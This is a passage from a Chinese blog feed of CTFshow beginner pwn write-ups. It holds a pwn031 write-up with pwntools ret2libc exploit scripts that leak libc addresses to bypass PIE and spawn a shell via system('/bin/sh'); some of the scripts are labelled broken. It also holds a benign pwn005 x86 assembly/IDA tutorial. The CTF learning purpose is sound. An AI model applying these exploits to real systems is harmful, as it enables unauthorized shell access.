an></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（二）C源代码"><a href="#（二）C源代码" class="headerlink" title="（二）C源代码"></a>（二）C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  setvbuf(stdin, 0, 1, 0);  setvbuf(stdout, 0, 2, 0);  printf("%p\n", main);  ctfshow(&amp;argc);  puts(asc_854);  puts(asc_8C8);  puts(asc_944);  puts(asc_9D0);  puts(asc_A60);  puts(asc_AE4);  puts(asc_B78);  puts("    * *************************************                           ");  puts(aClassifyCtfsho);  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Bypass ALSR &amp; PIE ");  puts("    * *************************************                           ");  write(0, "Hello CTFshow!\n", 0xEu);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726020622786.png" alt="image-20230726020622786"></p><ul><li>RELRO: Full RELRO：RELRO是Relocation Read-Only的缩写，它是一种保护机制，可以防止攻击者修改GOT表。Full RELRO表示启用了完全的RELRO保护，这意味着GOT表在程序启动后就被设置为只读，我们不能直接修改GOT表来改变函数的地址。</li><li>Stack: No canary found：这表示程序的栈没有启用栈保护（也称为栈溢出保护或栈破坏检测）。通常，启用栈保护的程序会在每个函数的栈帧中添加一个“栈保护”，这是一个随机的值。在函数返回前，程序会检查这个值是否被改变，如果被改变，程序就会立即崩溃，防止攻击者利用缓冲区溢出覆盖函数的返回地址。但是在这个程序中，没有启用栈保护，所以我们可以通过缓冲区溢出来覆盖函数的返回地址。</li><li>NX: NX enabled：NX是No-eXecute的缩写，它是一种保护机制，可以防止攻击者在栈或堆上执行代码。启用NX保护的程序会将栈和堆设置为不可执行，这意味着我们不能直接在栈或堆上执行shellcode。但是我们仍然可以使用ROP（Return-oriented programming）技术来执行代码。</li><li>PIE: PIE enabled：PIE是Position Independent Executable的缩写，它是一种保护机制，可以使程序的地址空间布局随机化。启用PIE的程序每次运行时，它的代码、数据和栈的地址都会随机变化。这意味着我们不能直接使用固定的地址来攻击程序，而需要先泄露一些地址，然后基于这些地址来计算其他地址。</li></ul><h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'io = remote('pwn.challenge.ctf.show', 28169)elf = ELF('./pwn031')libc = ELF('/lib32/libc.so.6')main = int(io.recvline(),16)base = main - elf.sym['main']ctfshow = base + elf.sym['ctfshow']write_plt = base + elf.sym['write']write_got = base + elf.got['write']ebx = base + 0x1fc0payload =b"A" * 132 + p32(ebx) + b"AAAA" + p32(write_plt) + p32(ctfshow) + p32(1) + p32(write_got) + p32(4)io.send(payload)write = u32(io.recv())libc_base = write - libc.sym['write']system_addr = libc_base + libc.sym['system']binsh_addr = libc_base + next(libc.search('/bin/sh'))payload = "B" * 140 + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)io.send(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-开了NX，无法直接覆盖执行shellcode"><a href="#1-开了NX，无法直接覆盖执行shellcode" class="headerlink" title="1.开了NX，无法直接覆盖执行shellcode"></a>1.开了NX，无法直接覆盖执行shellcode</h4><h4 id="2-开了PIE"><a href="#2-开了PIE" class="headerlink" title="2.开了PIE"></a>2.开了PIE</h4><p>PIE（位置独立可执行文件）是一种保护机制，它将使得每次程序运行时的加载地址都是随机的，这包括代码段、数据段、堆和栈等。由于这个随机性，我们无法直接知道函数或变量的绝对地址。</p><p>在你的例子中，<code>write_got = elf.got['write']</code> 是试图获取 ‘write’ 函数在 GOT 表中的地址。然而，如果启用了 PIE，这个地址在每次程序运行时都会发生改变，所以这样直接获取的地址并不能在运行时使用。</p><p>解决这个问题的一种常见方法是信息泄露（Information Leak），即通过一些方式（如格式化字符串漏洞、越界读等）获取到运行时的内存布局信息，进而计算出真正的运行时地址。另外，一些保护绕过技巧，如部分重叠覆盖（Partial Overwrite）、返回导向编程（ROP）等，也经常被用来对抗 PIE。</p><p>综上，如果启用了PIE，直接使用诸如 <code>elf.got['write']</code> 这样的方式来获取函数或变量的地址是不可行的。需要先找到信息泄露的点，获取到程序运行时的实际加载地址，然后基于这个地址来计算出函数或变量在运行时的真实地址。</p><h4 id="3-知道main函数地址"><a href="#3-知道main函数地址" class="headerlink" title="3.知道main函数地址"></a>3.知道main函数地址</h4><p>如果你已经知道了程序运行时 <code>main</code> 函数的地址，这可以帮助你计算出其他函数或变量的运行时地址，这是因为你可以根据这个已知的地址和你在二进制文件中看到的偏移来计算出其他地址。这就是基于信息泄露获取内存布局信息的基本思想。</p><p>在你的例子中，假设你已经知道了 <code>main</code> 函数在运行时的地址（例如 <code>0x56557652</code>），你也知道了 <code>main</code> 函数和 <code>write</code> 函数在二进制文件中的偏移量（这可以通过分析二进制文件得到）。那么，你就可以用 <code>main</code> 函数的运行时地址加上这个偏移量，得到 <code>write</code> 函数的运行时地址。</p><p>请注意，这种方法的前提是你的程序是位置独立的（也就是说，启用了PIE），并且你已经通过某种方式（例如，格式化字符串漏洞、越界读等）获得了一些内存布局信息。在没有任何内存布局信息的情况下，你将无法确定这些运行时地址。</p><h4 id="4-尝试泄露和利用write函数地址"><a href="#4-尝试泄露和利用write函数地址" class="headerlink" title="4.尝试泄露和利用write函数地址"></a>4.尝试泄露和利用write函数地址</h4><p>在IDA中，这行代码表示一个名为 <code>write</code> 的外部函数。下面是每个字段的含义：</p><ul><li><p><code>write</code>：这是该项的名称，也就是函数名。</p></li><li><p><code>extern</code>：这表明 <code>write</code> 是一个外部函数，也就是说，它的实现不在当前的二进制文件中，而是在某个外部的库（比如libc库）中。</p></li><li><p><code>00002024</code>：这是 <code>write</code> 在GOT（全局偏移表）中的地址。由于 <code>write</code> 是一个外部函数，所以在运行时，它的真实地址会被填充到GOT中的这个位置。</p></li><li><p><code>00000004</code>：这个字段通常表示该项的大小。在这个例子中，它表示 <code>write</code> 函数的地址在GOT中的大小，也就是4字节。</p></li><li><p><code>00000000</code>：这个字段表示该项的值。由于 <code>write</code> 是一个外部函数，所以在这里，它的值是0。</p></li><li><p><code>R</code>：这表示该项是只读的。</p></li><li><p><code>T</code>：这表示该项是一个文本项，也就是说，它是一个函数。</p></li></ul><p>要注意的是，因为 <code>write</code> 是一个外部函数，所以你无法直接通过在二进制文件中找到它的地址。然而，你可以通过分析程序在运行时的内存布局，找到它的真实地址。这通常涉及到一些内存泄露的技术，或者通过GOT和PLT（程序链接表）来找到它的地址。</p><h4 id="5-python3-pwn031-py报错"><a href="#5-python3-pwn031-py报错" class="headerlink" title="5.python3 pwn031.py报错"></a>5.python3 pwn031.py报错</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230728002837740.png" alt="image-20230728002837740"></p><p>看起来你正在使用 Python 3，但 <code>print</code> 的语法是按照 Python 2 的语法写的。在 Python 3 中，<code>print</code> 是一个函数，所以你应该使用括号。尝试将你的代码修改为如下形式：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">print(hex(write))  # 打印 write 函数的地址。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Python 3 中，所有的 <code>print</code> 语句都需要用括号包裹其参数。这是 Python 2 和 Python 3 的主要区别之一。如果你的代码还有其他的 <code>print</code> 语句，也要做同样的修改。</p><h4 id="6-脚本错误-x-1"><a href="#6-脚本错误-x-1" class="headerlink" title="6.脚本错误 x 1"></a>6.脚本错误 x 1</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'io = remote('pwn.challenge.ctf.show', 28169)elf = ELF('./pwn031')libc = ELF('/lib32/libc.so.6')# 程序加载到内存中的基址base_addr = 0x56557000# main函数的地址main = 0x56557652# write在GOT表中的偏移量（使用IDA获取）write_got_offset = 0x2024# 计算write在内存中的真实地址write_got = base_addr + write_got_offsetwrite_plt = elf.plt['write']payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4)io.sendline(payload)write = u32(io.recv(4))print(hex(write))libc = LibcSearcher('write',write)libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload = cyclic(0x88+0x4) + p32(system) + p32(main) + p32(bin_sh)io.sendline(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230728012938638.png" alt="image-20230728012938638"></p><p>对于动态链接库的函数，它们的确切地址在运行时才会被确定，因此在静态分析阶段我们不能直接从ELF文件中获取它们的地址。</p><p>在你的情况中，<code>write</code>函数是一个系统调用，它的实际实现在glibc库中，因此你不能从你的ELF文件中直接获取它的地址。你需要在运行时确定它的地址。</p><p>然后，你在代码中尝试使用<code>write_plt = elf.plt['write']</code>获取<code>write</code>函数的地址，这在正常情况下应该是有效的。但是如果你的程序并没有直接调用<code>write</code>函数，那么<code>write</code>函数就不会出现在PLT表中，导致这行代码会引发KeyError。</p><p>在你的情况下，如果你知道<code>write</code>函数的确切地址，你可以直接使用这个地址。但是如果你不知道确切的地址，你可能需要使用其他的技术来获取这个地址，比如使用ROP链或者返回到PLT（Return-to-plt）等技术。</p><h4 id="7-错误脚本x2"><a href="#7-错误脚本x2" class="headerlink" title="7.错误脚本x2"></a>7.错误脚本x2</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'io = remote('pwn.challenge.ctf.show', 28169)elf = ELF('./pwn031')libc = ELF('/lib32/libc.so.6')main=0x56557652rop = ROP(elf)  # 创建一个 ROP 对象rop.call(gadget_address, [1, got_write_address, 4])  # 调用你的 gadget，第一个参数是文件描述符，第二个参数是要写的地址，第三个参数是写的字节数io.sendline(cyclic(0x88+0x4) + str(rop))  # 发送 payloadwrite = u32(io.recv(4))  # 接收 write 函数的运行时地址print(hex(write))  # 打印 write 函数的地址libc_base = write - libc.sym['write']  # 计算 libc 的基址system = libc_base + libc.sym['system']  # 计算 system 函数的地址bin_sh = libc_base + next(libc.search(b'/bin/sh'))  # 计算 "/bin/sh" 字符串的地址rop2 = ROP(libc)  # 创建一个新的 ROP 对象rop2.call(system, [bin_sh])  # 调用 system("/bin/sh")io.sendline(cyclic(0x88+0x4) + str(rop2))  # 发送新的 payloadio.interactive()  # 进入交互模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>write</code> 函数不在程序的导入表 (the import table, 也叫动态符号表，ELF 文件的一部分) 中，所以 <code>elf.got['write']</code> 和 <code>elf.plt['write']</code> 都会失败。这个错误告诉我们，程序并没有直接调用 <code>write</code> 函数。那么 <code>write</code> 函数是如何被调用的呢？可能是间接地通过其他函数调用的，比如 <code>printf</code> 或者 <code>puts</code>。如果是这种情况，你将无法直接从 <code>elf</code> 对象获取 <code>write</code> 函数的 GOT 和 PLT 项。</p><p>然后，你的程序存在一个栈溢出漏洞，可以通过这个漏洞利用返回导向编程 (Return Oriented Programming，ROP) 技术执行任意代码。</p><p>ROP 的主要思想是寻找程序中的一些代码片段 (称为 “gadgets”)，这些代码片段在执行后会返回 (即，以 RET 指令结束)。然后，你可以通过控制栈来执行这些 gadgets，以此实现任意的计算。在你的情况下，你可以使用 ROP 来调用 <code>write</code> 函数，泄露出某个已知函数的运行时地址，然后根据这个地址和你的 libc 库来计算出其他函数的运行时地址。</p><p>以下是具体步骤：</p><ol><li><p>首先，你需要找到一个 gadget，它需要做以下的操作：调用 <code>write</code> 函数，然后返回。这个 gadget 可能看起来类似于：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push [got_write_address]  ; 把 write 函数的地址压入栈call [write_plt_address]  ; 调用 write 函数ret                       ; 返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意：以上的汇编代码只是一个示例，并不一定存在于你的程序中。你需要使用反编译工具 (如 IDA 或者 radare2) 来寻找合适的 gadget。</p></li><li><p>然后，你需要构造一个 ROP 链，调用这个 gadget 来泄露出 <code>write</code> 函数的运行时地址。在 pwntools 中，可以使用 <code>pwnlib.rop.ROP</code> 类来构造 ROP 链。一个简单的例子可能如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'io = remote('pwn.challenge.ctf.show', 28169)elf = ELF('./pwn031')libc = ELF('/home/ctfshow/libc/32bit/libc.so.6')main=0x56557652rop = ROP(elf)  # 创建一个 ROP 对象rop.call(gadget_address, [1, got_write_address, 4])  # 调用你的 gadget，第一个参数是文件描述符，第二个参数是要写的地址，第三个参数是写的字节数io.sendline(cyclic(0x88+0x4) + str(rop))  # 发送 payloadwrite = u32(io.recv(4))  # 接收 write 函数的运行时地址print(hex(write))  # 打印 write 函数的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>gadget_address</code> 是你在第一步中找到的 gadget 的地址，<code>got_write_address</code> 是 <code>write</code> 函数的 GOT 表项的地址。</p></li><li><p>一旦你获取到了 <code>write</code> 函数的运行时地址，你可以计算出其他函数的运行时地址，然后再构造一个新的 ROP 链来调用 <code>system("/bin/sh")</code>，以获取 shell。例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc_base = write - libc.sym['write']  # 计算 libc 的基址system = libc_base + libc.sym['system']  # 计算 system 函数的地址bin_sh = libc_base + next(libc.search(b'/bin/sh'))  # 计算 "/bin/sh" 字符串的地址rop2 = ROP(libc)  # 创建一个新的 ROP 对象rop2.call(system, [bin_sh])  # 调用 system("/bin/sh")io.sendline(cyclic(0x88+0x4) + str(rop2))  # 发送新的 payloadio.interactive()  # 进入交互模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>以上的所有代码都是示例性的，并且基于你的原始代码，可能需要根据你的具体情况进行修改。在具体实施过程中，可能还会遇到各种问题。比如：</p><ul><li>找到正确的 gadget 可能是一项挑战。一个可用的方法是使用像 <code>ROPgadget</code> 这样的工具，它可以自动分析二进制文件，寻找可能的 gadgets。</li><li>在实际的 exploitation 中，可能还需要处理各种细节问题，比如需要注意栈对齐的问题，确保不会因为对齐问题而导致 crash。</li><li>在你获得 shell 后，还需要保证可以持续和 shell 交互。在某些情况下，你可能需要在你的 ROP 链中包含一些额外的 gadgets，来确保你可以持续和新的 shell 进程进行交互。</li></ul><p>希望以上的解释和示例代码可以帮助你理解如何利用 ROP 来绕过全局偏移表 (GOT) 和过程链接表 (PLT) 的问题，从而成功利用这个漏洞。不过，我还是需要强调，每个 exploitation 都是具体的，以上的示例代码可能并不完全适用于你的情况。你可能需要进行一些调整，或者采用一些额外的技术和策略，才能成功利用这个漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN入门刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn005</title>
      <link href="/du-yu/pwn-begain-exerciser-02.html"/>
      <url>/du-yu/pwn-begain-exerciser-02.html</url>
      
        <content type="html"><![CDATA[<h1 id="PWN005"><a href="#PWN005" class="headerlink" title="PWN005"></a>PWN005</h1><h2 id="一、asm文件"><a href="#一、asm文件" class="headerlink" title="一、asm文件"></a>一、asm文件</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">section .data             ; 这一行定义了一个名为 .data 的数据段，这个段通常用于存储程序的全局变量和静态变量。    msg db "Welcome_to_CTFshow_PWN", 0  ; 这一行在 .data 段中定义了一个名为 msg 的变量，db 表示 "define byte"，也就是定义一个字节。"Welcome_to_CTFshow_PWN" 是一个字符串，每个字符占一个字节，字符串后面的 0 表示字符串的结束符。section .text             ; 这一行定义了一个名为 .text 的文本段，这个段通常用于存储程序的代码。    global _start         ; 这一行声明了一个全局符号 _start。在 Unix-like 系统中，_start 通常是程序的入口点。_start:                   ; 这一行定义了一个标签 _start，这是程序的入口点。在这里，程序的执行将从这个位置开始。; 立即寻址方式    mov eax, 11         ; 将11赋值给eax    add eax, 114504     ; eax加上114504    sub eax, 1          ; eax减去1; 寄存器寻址方式    mov ebx, 0x36d      ; 将0x36d赋值给ebx    mov edx, ebx        ; 将ebx的值赋值给edx; 直接寻址方式    mov ecx, msg      ; 将msg的地址赋值给ecx; 寄存器间接寻址方式    mov esi, msg        ; 将msg的地址赋值给esi    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax; 寄存器相对寻址方式    mov ecx, msg        ; 将msg的地址赋值给ecx    add ecx, 4          ; 将ecx加上4    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax; 基址变址寻址方式    mov ecx, msg        ; 将msg的地址赋值给ecx    mov edx, 2          ; 将2赋值给edx    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax; 相对基址变址寻址方式    mov ecx, msg        ; 将msg的地址赋值给ecx    mov edx, 1          ; 将1赋值给edx    add ecx, 8          ; 将ecx加上8    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax; 输出字符串    mov eax, 4          ; 系统调用号4代表输出字符串    mov ebx, 1          ; 文件描述符1代表标准输出    mov ecx, msg        ; 要输出的字符串的地址    mov edx, 22         ; 要输出的字符串的长度    int 0x80            ; 调用系统调用; 退出程序    mov eax, 1          ; 系统调用号1代表退出程序    xor ebx, ebx        ; 返回值为0    int 0x80            ; 调用系统调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、获取字符串"><a href="#二、获取字符串" class="headerlink" title="二、获取字符串"></a>二、获取字符串</h2><p>1、nasm -f elf pwn005welcome_to_CTFshow.sam   （用NASM编译器将汇编文件编译为elf二进制文件）</p><p>2、ld -m elf_i386 -s -o 110pwn pwn005welcome_to_CTFshow.o  （链接成一个 32 位的、去除了符号信息的 ELF 格式的可执行文件）</p><p><code>-s</code>：这是一个选项，表示我们要去除（strip）生成的可执行文件中的所有符号信息。这可以使得生成的文件更小，但也使得调试变得更困难</p><p>3、运行文件得到字符串</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713164705629.png" alt="image-20230713164705629"></p><h2 id="三、IDA思考解析"><a href="#三、IDA思考解析" class="headerlink" title="三、IDA思考解析"></a>三、IDA思考解析</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230714182900681.png" alt="image-20230714182900681"></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">LOAD:08048000                               ; Segment type: Pure codeLOAD:08048000                               ; Segment permissions: Read/ExecuteLOAD:08048000                               LOAD segment mempage public 'CODE' use32 ; 定义一个名为 LOAD 的代码段，这个段是公开的，可以被其他模块访问，使用32位地址LOAD:08048000                               assume cs:LOAD                          ; 假设代码段寄存器 cs 指向 LOAD 段LOAD:08048000                               ;org 8048000h                            ; 设置程序的起始地址为 0x8048000LOAD:08048000                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing ; 假设其他段寄存器没有指向任何段，数据段寄存器 ds 指向 _data 段LOAD:08048000 7F 45 4C 46                   dword_8048000 dd 464C457Fh              ; 定义一个名为 dword_8048000 的变量，值为 0x464C457F，这是 ELF 文件的魔数LOAD:08048004 01                            db 1                                    ; 文件类别：32位LOAD:08048005 01                            db 1                                    ; 数据编码：小端LOAD:08048006 01                            db 1                                    ; 文件版本LOAD:08048007 00                            db 0                                    ; 操作系统/ABI：UNIX System V ABILOAD:08048008 00                            db 0                                    ; ABI 版本LOAD:08048009 00 00 00 00 00 00 00          db 7 dup(0)                             ; 填充字节，没有实际意义LOAD:08048010 02 00                         dw 2                                    ; 文件类型：可执行文件LOAD:08048012 03 00                         dw 3                                    ; 机器类型：Intel 386LOAD:08048014 01 00 00 00                   dd 1                                    ; 文件版本LOAD:08048018 80 80 04 08                   dd offset start                         ; 程序入口点的地址LOAD:0804801C 34 00 00 00                   dd 34h                                  ; 程序头表（Program Header Table，PHT）在文件中的偏移LOAD:08048020 18 01 00 00                   dd 118h                                 ; 节头表（Section Header Table，SHT）在文件中的偏移LOAD:08048024 00 00 00 00                   dd 0                                    ; 处理器特定的标志，对于 Intel 386，这个字段没有用LOAD:08048028 34 00                         dw 34h                                  ; ELF 头的大小LOAD:0804802A 20 00                         dw 20h                                  ; 程序头表条目的大小LOAD:0804802C 02 00                         dw 2                                    ; 程序头表的条目数LOAD:0804802E 28 00                         dw 28h                                  ; 节头表条目的大小LOAD:08048030 04 00                         dw 4                                    ; 节头表的条目数LOAD:08048032 03 00                         dw 3                                    ; 字符串表的节头表条目索引LOAD:08048034                               ; ELF32 Program HeaderLOAD:08048034                               ; PHT Entry 0LOAD:08048034 01 00 00 00                   dd 1                                    ; 类型：LOADLOAD:08048038 00 00 00 00                   dd 0                                    ; 在文件中的偏移LOAD:0804803C 00 80 04 08                   dd offset dword_8048000                 ; 虚拟地址LOAD:08048040 00 80 04 08                   dd 8048000h                             ; 物理地址LOAD:08048044 E8 00 00 00                   dd 0E8h                                 ; 在文件映像中的大小LOAD:08048048 E8 00 00 00                   dd 0E8h                                 ; 在内存映像中的大小LOAD:0804804C 05 00 00 00                   dd 5                                    ; 标志LOAD:08048050 00 10 00 00                   dd 1000h                                ; 对齐LOAD:08048054                               ; PHT Entry 1LOAD:08048054 01 00 00 00                   dd 1                                    ; 类型：LOADLOAD:08048058 E8 00 00 00                   dd 0E8h                                 ; 在文件中的偏移LOAD:0804805C E8 90 04 08                   dd offset dword_80490E8                 ; 虚拟地址LOAD:08048060 E8 90 04 08                   dd 80490E8h                             ; 物理地址LOAD:08048064 17 00 00 00                   dd 17h                                  ; 在文件映像中的大小LOAD:08048068 17 00 00 00                   dd 17h                                  ; 在内存映像中的大小LOAD:0804806C 06 00 00 00                   dd 6                                    ; 标志LOAD:08048070 00 10 00 00                   dd 1000h                                ; 对齐LOAD:08048074 00 00 00 00 00 00 00 00 00 00+align 10hLOAD:08048074 00 00                         LOAD ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230714184240261.png" alt="image-20230714184240261"></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">以下是这段代码的行注释：.data:080490E8                               ; Segment type: Pure data; 段类型：纯数据.data:080490E8                               ; Segment permissions: Read/Write; 段权限：读/写.data:080490E8                               _data segment dword public 'DATA' use32; 定义数据段，使用32位双字，公共标识为'DATA'.data:080490E8                               assume cs:_data; 假设代码段指向_data.data:080490E8                               ;org 80490E8h; 设置段的初始地址为80490E8h.data:080490E8 57 65 6C 63                   dword_80490E8 dd 636C6557h              ; DATA XREF: LOAD:0804805C↑o; 在地址80490E8上定义一个双字数据636C6557h，并标记其数据交叉引用.data:080490E8                                                                       ; start+14↑r; 数据交叉引用的偏移地址：从start开始向上偏移14.data:080490E8                                                                       ; start+1A↑o; 数据交叉引用的偏移地址：从start开始向上偏移1A.data:080490E8                                                                       ; start+21↑o; 数据交叉引用的偏移地址：从start开始向上偏移21.data:080490E8                                                                       ; start+2B↑o; 数据交叉引用的偏移地址：从start开始向上偏移2B.data:080490E8                                                                       ; start+38↑o; 数据交叉引用的偏移地址：从start开始向上偏移38.data:080490E8                                                                       ; start+53↑o; 数据交叉引用的偏移地址：从start开始向上偏移53.data:080490EC 6F 6D 65 5F 74 6F 5F 43 54 46+aOmeToCtfshowPw db 'ome_to_CTFshow_PWN',0; 在地址080490EC上定义一个字节数据，字符串为'ome_to_CTFshow_PWN'，以0结尾.data:080490EC 73 68 6F 77 5F 50 57 4E 00    _data ends; 数据段结束.data:080490EC; 一个空行，没有指令或数据.data:080490EC; 另一个空行，没有指令或数据.data:080490EC                               end start; 程序结束，start是程序的开始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1、这部分代码是-IDA-反汇编结果中的数据段（-data）部分，主要包含了你在原始汇编代码中定义的全局变量-msg。下面是每一行的解释："><a href="#1、这部分代码是-IDA-反汇编结果中的数据段（-data）部分，主要包含了你在原始汇编代码中定义的全局变量-msg。下面是每一行的解释：" class="headerlink" title="1、这部分代码是 IDA 反汇编结果中的数据段（.data）部分，主要包含了你在原始汇编代码中定义的全局变量 msg。下面是每一行的解释："></a>1、这部分代码是 IDA 反汇编结果中的数据段（<code>.data</code>）部分，主要包含了你在原始汇编代码中定义的全局变量 <code>msg</code>。下面是每一行的解释：</h3><ul><li><p><code>.data:080490E8 57 65 6C 63 dword_80490E8 dd 636C6557h</code>：这一行定义了一个名为 <code>dword_80490E8</code> 的四字节（double word）变量，它的值是 <code>636C6557h</code>，这是一个十六进制数。这个十六进制数对应的 ASCII 字符串是 “Welc”，这是 “Welcome_to_CTFshow_PWN” 的前四个字符。<code>57 65 6C 63</code> 是 “Welc” 的十六进制 ASCII 码，它们是以小端字节序排列的，所以在这里看起来顺序是反的。</p></li><li><p>接下来的几行（<code>.data:080490E8</code>）是空行，它们没有包含任何代码。但是，这些行后面的注释（如 <code>; start+14↑r</code>）表示 <code>dword_80490E8</code> 在 <code>.text</code> 段中的引用位置。</p></li><li><p><code>.data:080490EC 6F 6D 65 5F 74 6F 5F 43 54 46+aOmeToCtfshowPw db 'ome_to_CTFshow_PWN',0</code>：这一行定义了一个字符串，它的内容是 “ome_to_CTFshow_PWN”，这是 “Welcome_to_CTFshow_PWN” 的剩余部分。<code>6F 6D 65 5F 74 6F 5F 43 54 46...</code> 是这个字符串的十六进制 ASCII 码。</p></li><li><p><code>.data:080490EC 73 68 6F 77 5F 50 57 4E 00 _data ends</code>：这一行表示数据段（<code>.data</code>）的结束。<code>73 68 6F 77 5F 50 57 4E 00</code> 是 “show_PWN” 和字符串结束符的十六进制 ASCII 码，这是 “Welcome_to_CTFshow_PWN” 的最后一部分。</p></li><li><p>最后的几行（<code>.data:080490EC end start</code>）表示程序的结束，<code>end start</code> 指定了程序的入口点是 <code>start</code>。</p></li></ul><p>总的来说，这部分代码就是 “Welcome_to_CTFshow_PWN” 这个字符串在内存中的表示形式。由于 x86 架构的 CPU 使用的是小端字节序，所以这个字符串的每四个字符被反序存储。</p><h3 id="2、DATA-XREF-LOAD-0804805C↑o和start-53↑o表示什么"><a href="#2、DATA-XREF-LOAD-0804805C↑o和start-53↑o表示什么" class="headerlink" title="2、DATA XREF: LOAD:0804805C↑o和start+53↑o表示什么"></a>2、DATA XREF: LOAD:0804805C↑o和start+53↑o表示什么</h3><p>在 IDA 的反汇编结果中，<code>DATA XREF: LOAD:0804805C↑o</code> 和 <code>start+53↑o</code> 这样的注释表示数据的交叉引用（cross-reference）。</p><ul><li><code>DATA XREF: LOAD:0804805C↑o</code>：这表示当前的数据（也就是 <code>dword_80490E8</code>）在地址 <code>0804805C</code> 的代码中被引用了。<code>XREF</code> 是 “cross-reference” 的缩写，<code>LOAD:0804805C</code> 是引用的位置，<code>↑o</code> 表示这是一个向上的引用（也就是说，引用的位置在当前位置的上方）。</li><li><code>start+53↑o</code>：这表示当前的数据在 <code>start</code> 标签后的第 53 个字节的代码中被引用了。<code>start+53</code> 是引用的位置，<code>↑o</code> 